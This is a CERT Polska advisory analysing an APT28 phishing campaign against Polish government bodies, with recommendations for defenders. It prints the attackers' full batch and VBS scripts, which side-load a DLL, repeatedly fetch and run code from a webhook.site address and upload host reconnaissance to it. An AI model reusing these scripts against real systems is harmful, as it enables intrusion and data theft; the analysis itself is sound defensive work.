<script>
    $body = $('body');

    function changed_mobile(media) {
        if (media.matches) {
            window.mobile = true;
            window.desktop = false;
            $body.removeClass('desktop');
            $body.addClass('mobile');
        } else {
            window.mobile = false;
            window.desktop = true;
            $body.removeClass('mobile');
            $body.addClass('desktop');
        }
    }

    let media = window.matchMedia('(max-width: 800px)');
    media.addEventListener('change', changed_mobile);
    changed_mobile(media);
</script>

<script>
    $(function() {
        let $mobile_header = $('.mobile-header');
        let $burger = $('.mobile-header .burger');
        let $menu_overlay = $('.mobile-header .menu-overlay');
        let $return = $('.mobile-header .return');

        let active = false;
        let level = 0;
        let $menu_root = $('.mobile-header .menu-root');

        let overlay_height = window.innerHeight - $('.mobile-header .top')[0].scrollHeight
            - $('.mobile-header .menu-bar')[0].scrollHeight;
        $('.mobile-header .menu-overlay').css({'height': overlay_height});

        $burger.on('click', function() {
            if (active) {
                active = false;
                $menu_overlay.fadeOut(200);
                $return.css({'opacity': 0});
                $mobile_header.css({'background-color': '#212E3B'});
                $burger.removeClass('active');
                $('body').css({'overflow': 'inherit'});
            } else {
                active = true;
                $menu_overlay.fadeIn(200);
                $return.css({'opacity': 1});
                $mobile_header.css({'background-color': '#121F29'});
                $burger.addClass('active');
                $('body').css({'overflow': 'hidden'});
            }
        });
        
        $return.on('click', function () {
            if (level < 1) return;

            $menu_root.find('> li > ul '.repeat(level)).removeClass('menu-active');
            level -= 1;
            $menu_root.css({'transform': 'translateX(' + (-level * 100) + 'vw)'});
            
            if (level === 0) {
                $return.css({'display': 'none'});
            }
        });
    
        $menu_root.on('click', function (event) {
            let $target = $(event.target);
            if ($target.hasClass('menu-button')) {
                level += 1;
                $menu_root.find('> li > ul '.repeat(level)).removeClass('menu-active');
                $target.children('ul').first().addClass('menu-active');
                $menu_root.css({'transform': 'translateX(' + (-level * 100) + 'vw)'});
                $return.css({'display': 'flex'});
            }
        });
        
        let last_scroll = window.scrollY, top = 0, max = $mobile_header.outerHeight();
        $(window).on('scroll', function() {
            top += last_scroll - window.scrollY;

            if (top < -max) top = -max;
            if (top > 0) top = 0;

            $mobile_header.css({'top': top + 'px'});
            last_scroll = window.scrollY;
        });
    });
</script>

<script>
    $(function() {
        let open = false;
        let active = null;
        let closeTimer = null;
        
        $('.desktop-header .menu-root .menu-button').on('mouseover', function() {
            let new_active = $(this).data('menu');
            
            if (active && active !== new_active) {
                $('.desktop-header .slide-menu-' + active).css({'display': 'none'});
                $('.desktop-header .menu-button').removeClass('active');
            }
            
            $('.desktop-header .slide-menu-' + new_active).css({'display': 'inherit'});
            $(this).addClass('active');
            active = new_active;
            
            let height = $('.desktop-header .slide-menu-' + active)[0].scrollHeight + 'px';
            $('.desktop-header .slide-menu-overlay').css({'height': height});
            
            if (!open) {
                open = true;
                $('.desktop-header').addClass('active');
                $('.desktop-header .slide-menu-overlay').css({'display': 'inherit'});
                
                if (height === '0px') {
                    height = $('.desktop-header .slide-menu-' + active)[0].scrollHeight + 'px';
                    $('.desktop-header .slide-menu-overlay').css({'height': height});
                }
            }
        });
        
        $('.desktop-header').on('mouseover', function() {
           clearTimeout(closeTimer);
        });
        
        $('.desktop-header').on('mouseout', function() {
            if (open) {
                closeTimer = setTimeout(function() {
                    $('.desktop-header').removeClass('active');
                    $('.desktop-header .menu-button').removeClass('active');
                    
                    $('.desktop-header .slide-menu-overlay').css({'height': '0'});

                    let _active = active;
                    setTimeout(function() {
                        $('.desktop-header .slide-menu-' + _active).css({'display': 'none'});
                    }, 250);
                    
                    active = null;
                    open = false;
                }, 400);
            }
        });
    });
</script>

 |         <a href="../../../../author/cert-polska/">CERT Polska</a> |         <a href="../../../../tag/warning/">#warning</a>,         <a href="../../../../tag/apt/">#apt</a>,         <a href="../../../../tag/apt28/">#apt28</a>                </div>

    <div class="content grid-container">
        <div class="grid-x grid-padding-x">
            <div class="main cell entry">
                <div class="article">
                    <p>This week, the CERT Polska (CSIRT NASK) and CSIRT MON teams observed a large-scale malware campaign targeting Polish government institutions.
Based on technical indicators and similarity to attacks described in the past <a href="https://cert.gov.ua/article/5702579">(e.g. on Ukrainian entities)</a>, 
the campaign can be associated with the APT28 activity set, which is associated with Main Directorate of the General Staff of the Armed Forces of the Russian Federation (GRU).</p>
<h2>Technical analysis</h2>
<p>The campaign sent e-mails with content intended to arouse the recipient's interest and persuade him to click on the link. An example of the message used is presented below:</p>
<p><img alt="" src="/uploads/2024/05/apt28-email.png"></p>
<p>Email's content translated to English:</p>
<div class="highlight"><pre><span></span><code>Subject: I solved your problem

Hello PaweÅ!
I did a little research and found this mysterious Ukrainian woman.
Now she is in Warsaw.
She runs a rather unusual company that sells used underwear.
also has clients from senior authorities in Poland and Ukraine.
All information on this subject is available at this link - ALINA-BOKLAN
</code></pre></div>


<p>The link directs to an address in the domain <code>run.mocky.io</code>.  It is a free service used by developers to create and test APIs. In this case, it was used only to redirect to another website <code>webhook.site</code> allowing logging all queries to the generated address and configuring responses to them. 
This website is also popular among people related to IT. The use of free, commonly used services instead of your own domains allows you to significantly reduce the detection of links as malicious, and at the same time reduces the cost of the operation. This is a trend we see across many APT groups.</p>
<p>Finally, a ZIP archive is downloaded from the website <code>webhook.site</code>, which name suggests the content in the form of photos. It starts with <code>IMG-</code> and ends with a random number (e.g. <code>IMG-238279780.zip</code>). 
After clicking on the archive, with the default Windows settings (hidden extensions and no showing of hidden files), the victim is presented with the following view:</p>
<p><img alt="" src="/uploads/2024/05/apt28-explorer.png"></p>
<p>The archive actually contains three files:</p>
<ul>
<li>a Windows calculator with a changed name, e.g. <code>IMG-238279780.jpg.exe</code>, which pretends to be a photo and encourages the victim to click,</li>
<li>script <code>.bat</code> (hidden file),</li>
<li>fake library <code>WindowsCodecs.dll</code> (hidden file).</li>
</ul>
<p>If the victim runs the file <code>IMG-238279780.jpg.exe</code> which is a harmless calculator, during startup it will try to load a library <code>WindowsCodecs.dll</code>that was substituted by the attackers. This is a technique known as <em>DLL Side-Loading</em>. The only role of the DLL is to run the included BAT script:</p>
<div class="highlight"><pre><span></span><code><span class="p">@</span><span class="k">echo</span> off
<span class="k">if</span> <span class="k">not</span> <span class="k">DEFINED</span> <span class="nv">IS_MINIMIZED</span> <span class="p">(</span>
    <span class="k">set</span> <span class="nv">IS_MINIMIZED</span><span class="p">=</span>1
    <span class="k">start</span> <span class="s2">&quot;&quot;</span> /min <span class="s2">&quot;</span><span class="nv">%~dpnx0</span><span class="s2">&quot;</span> <span class="nv">%*</span>
    <span class="k">exit</span>
<span class="p">)</span>

<span class="k">start</span> msedge data:text/html;base64,
timeout 15 <span class="p">&gt;</span> nul
<span class="k">move</span> <span class="nv">%userprofile%</span>\downloads\IMG-63492336968.jpg <span class="nv">%programdata%</span>\IMG-63492336968.cmd <span class="p">&gt;</span> nul
<span class="k">type</span> nul <span class="p">&gt;</span> <span class="nv">%userprofile%</span>\downloads\IMG-63492336968.jpg
<span class="k">call</span> <span class="nv">%programdata%</span>\IMG-63492336968.cmd
<span class="k">del</span> /q /f /a <span class="nv">%0</span>
<span class="k">exit</span>
</code></pre></div>


<p>The BAT script opens the Microsoft Edge browser, which loads the base64-encoded page content to download another batch script (also using the website <code>webhook.site</code>). 
At the same time, the browser displays photos of an actual woman in a swimsuit along with links to her real accounts on social media platforms. This is intended to make the attackers' narrative credible and to lull the recipient's vigilance. The script saves the downloaded file with the .jpg extension on disk, changes the extension from .jpg to .cmd and finally executes it.</p>
<div class="highlight"><pre><span></span><code><span class="p">@</span><span class="k">echo</span> off <span class="p">&amp;</span> <span class="p">(</span>
    <span class="k">echo</span> On Error Resume Next
    <span class="k">echo</span> CreateObject(<span class="s2">&quot;WScript.shell&quot;</span><span class="p">)</span>.Run <span class="s2">&quot;^&quot;&quot;</span><span class="se">%%</span><span class="s2">programdata</span><span class="se">%%</span><span class="s2">\\dee016bf-21a2-45dd-86b4-6099747794c4.bat^&quot;</span><span class="se">^^</span><span class="s2">&quot;&quot;</span>, 0, False
    <span class="k">echo</span> Set oFso = CreateObject(<span class="s2">&quot;Scripting.FileSystemObject&quot;</span>) : oFso.DeleteFile Wscript.ScriptFullName, True
<span class="c1">) &gt; &quot;%programdata%\dee016bf-21a2-45dd-86b4-6099747794c4.vbs&quot; &amp; echo del %%0 ^&amp; for /l %%%%n in () do (</span>
    chcp 65001 <span class="se">^&amp;</span> timeout 300 <span class="se">^&amp;</span> taskkill /im msedge.exe /f <span class="se">^&amp;</span> timeout 5 <span class="se">^&amp;</span> del /q /f <span class="s2">&quot;</span><span class="se">%%</span><span class="s2">userprofile</span><span class="se">%%</span><span class="s2">\Downloads\*.css&quot;</span> <span class="se">^&amp;</span> start <span class="s2">&quot;&quot;</span> msedge --headless=new --disable-gpu data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgiaHR0cHM6Ly93ZWJob29rLnNpdGUvZGVlMDE2YmYtMjFhMi00NWRkLTg2YjQtNjA5OTc0Nzc5NGM0Iik7PC9zY3JpcHQ+ <span class="se">^&amp;</span> timeout 30 <span class="se">^&amp;</span> taskkill /im msedge.exe /f <span class="se">^&amp;</span> move /y <span class="s2">&quot;</span><span class="se">%%</span><span class="s2">userprofile</span><span class="se">%%</span><span class="s2">\Downloads\*.css&quot;</span> <span class="s2">&quot;</span><span class="se">%%</span><span class="s2">programdata</span><span class="se">%%</span><span class="s2">\dee016bf-21a2-45dd-86b4-6099747794c4.cmd&quot;</span> <span class="se">^&amp;</span> call <span class="s2">&quot;</span><span class="se">%%</span><span class="s2">programdata</span><span class="se">%%</span><span class="s2">\dee016bf-21a2-45dd-86b4-6099747794c4.cmd&quot;</span> <span class="se">^&amp;</span> del /q /f <span class="s2">&quot;</span><span class="se">%%</span><span class="s2">programdata</span><span class="se">%%</span><span class="s2">\dee016bf-21a2-45dd-86b4-6099747794c4.cmd&quot;</span>
<span class="c1">) &gt; &quot;%programdata%\dee016bf-21a2-45dd-86b4-6099747794c4.bat&quot; &amp; (</span>
    <span class="k">echo</span> <span class="se">^&lt;</span>!DOCTYPE html<span class="se">^&gt;^&lt;</span>html<span class="se">^&gt;^&lt;</span>body<span class="se">^&gt;^&lt;</span>script<span class="se">^&gt;</span>var xhr = new XMLHttpRequest<span class="se">^(^)</span>;var text = String.raw<span class="se">^`</span>)
<span class="c1">) &gt; &quot;%programdata%\uaxhexd.tab&quot; &amp; (</span>
    <span class="k">echo</span> <span class="se">^`</span>;xhr.open<span class="se">^(^&#39;</span>PUT<span class="se">^&#39;</span>, <span class="se">^&#39;</span>https://webhook.site/dee016bf-21a2-45dd-86b4-6099747794c4<span class="se">^&#39;^)</span>;xhr.setRequestHeader<span class="se">^(^&#39;</span>Content-Type<span class="se">^&#39;</span>, <span class="se">^&#39;</span>text/html<span class="se">^&#39;^)</span>;xhr.send<span class="se">^(</span>text<span class="se">^)</span>;<span class="se">^&lt;</span>/script<span class="se">^&gt;^&lt;</span>/body<span class="se">^&gt;^&lt;</span>/html<span class="se">^&gt;</span>
<span class="c1">) &gt; &quot;%programdata%\ohqddqtqc.tsv&quot; &amp; start &quot;&quot; &quot;%programdata%\dee016bf-21a2-45dd-86b4-6099747794c4.vbs&quot; &amp; del %0</span>
</code></pre></div>


<p>This script constitutes the main loop of the program. In the loop <code>for /l %n in ()</code> it first waits for 5 minutes, and then, similarly as before, downloads another script using the Microsoft Edge browser and the reference to <code>webhook.site</code> and executes it. 
This time, the file with the extension <code>.css</code> is downloaded, then its extension is changed to <code>.cmd</code> and launched.</p>
<p>The script we finally received collects only information about the computer (IP address and list of files in selected folders) on which they were launched,
and then send them to the C2 server. Probably computers of the victims selected by the attackers receive a different set of the endpoint scripts.</p>
<div class="highlight"><pre><span></span><code><span class="p">@</span><span class="k">echo</span> off
chcp 65001
taskkill /im msedge.exe /f
<span class="p">(</span><span class="k">dir</span> <span class="s2">&quot;</span><span class="nv">%userprofile%</span><span class="s2">\..&quot;</span> <span class="p">&amp;</span> <span class="k">dir</span> <span class="s2">&quot;</span><span class="nv">%userprofile%</span><span class="s2">\Desktop&quot;</span> <span class="p">&amp;</span> <span class="k">dir</span> <span class="s2">&quot;</span><span class="nv">%userprofile%</span><span class="s2">\Downloads&quot;</span> <span class="p">&amp;</span> <span class="k">dir</span> <span class="s2">&quot;</span><span class="nv">%userprofile%</span><span class="s2">\Documents&quot;</span> <span class="p">&amp;</span> <span class="k">dir</span> <span class="s2">&quot;</span><span class="nv">%ProgramFiles%</span><span class="s2">&quot;</span> <span class="p">&amp;</span> <span class="k">dir</span> <span class="s2">&quot;</span><span class="nv">%ProgramFiles(x86)%</span><span class="s2">&quot;</span> <span class="p">&amp;</span> curl -k https://ipinfo.io<span class="p">)</span> <span class="p">&gt;</span> <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\bwjxyeysed.diff&quot;</span>
<span class="k">copy</span> <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\*.tab&quot;</span> + <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\*.diff&quot;</span> + <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\*.tsv&quot;</span> <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\nydgflyhuv.html&quot;</span>
<span class="p">(</span><span class="k">echo</span> <span class="nv">%programdata%</span><span class="p">)</span> <span class="p">&gt;</span> <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\gjvrexfiac&quot;</span>
<span class="k">set</span> <span class="k">/p</span> <span class="nv">gjvrexfiac</span><span class="p">=&lt;</span><span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\gjvrexfiac&quot;</span>
timeout 5
<span class="k">start</span> <span class="s2">&quot;&quot;</span> msedge --headless=new --disable-gpu <span class="s2">&quot;file:///</span><span class="nv">%gjvrexfiac%</span><span class="s2">/nydgflyhuv.html&quot;</span>
timeout 30
taskkill /im msedge.exe /f
<span class="k">del</span> /q /f <span class="s2">&quot;</span><span class="nv">%userprofile%</span><span class="s2">\Downloads\*.css&quot;</span>
<span class="k">del</span> /q /f <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\gjvrexfiac&quot;</span>
<span class="k">del</span> /q /f <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\*.diff&quot;</span>
<span class="k">del</span> /q /f <span class="s2">&quot;</span><span class="nv">%programdata%</span><span class="s2">\nydgflyhuv.html&quot;</span>
</code></pre></div>


<p>The entire attack flow is shown in the diagram below. Its course is identical to that of the HEADLACE malware <a href="https://securityintelligence.com/x-force/itg05-ops-leverage-israel-hamas-conflict-lures-to-deliver-headlace-malware/">publicly described in the past</a>.</p>
<p><img alt="" src="/uploads/2024/05/apt28-graph.png"></p>
<h2>Recommendations</h2>
<p>The primary purpose of this publication is to disrupt hostile activities and enable the detection and analysis of the described activities. The CERT Polska team recommends the network administrators to check whether the organization's employees have not been the subject of an attack.</p>
<ul>
<li>We recommend verifying recent connections to domains <code>webhook.site</code> and <code>run.mocky.io</code> as well as their presence in received emails. We also emphasize that these are websites commonly used by programmers and traffic to them does not necessarily mean infection.</li>
<li>If your organization does not use the above-mentioned services, we recommend that you consider blocking the above-mentioned domains on edge devices.</li>
<li>Regardless of whether you use the above-mentioned websites, we also recommend filtering emails for links in <code>webhook.site</code> and <code>run.mocky.io</code>, because cases of their legitimate use in the email content are very rare.</li>
</ul>
<p>Websites of this type have already been used many times in campaigns related to APT groups.</p>
<p>If you suspect a malware infection, we recommend disconnecting your device from the network (both wired and wireless) and contacting the appropriate CSIRT team immediately.</p>
